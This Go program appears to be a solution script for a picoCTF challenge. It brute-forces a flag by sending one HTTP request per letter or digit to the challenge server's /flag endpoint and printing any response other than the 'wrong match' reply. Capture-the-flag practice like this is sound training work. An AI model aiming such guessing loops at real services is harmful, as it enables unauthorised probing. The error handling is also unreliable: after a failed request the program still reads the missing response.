package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
)


func main(){
	client := http.Client{}

	inputs := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

	url := "http://saturn.picoctf.net:50192/flag?input=picoctf{"

	for _, ch := range inputs{

		req, err := http.NewRequest("GET", url + string(ch) + "}", nil)
		if err != nil {
			log.Fatalln(err)
		}

		resp, err := client.Do(req)
		if err != nil {
			log.Println("Error sending req", err)
		}

		body, err := io.ReadAll(resp.Body)

		if err != nil {
			log.Println("Error body ", err)
		}

		if string(body) != `{"flag":"wrong match! Try again!"}`{
		fmt.Println(string(body), req)
		}

	}

}
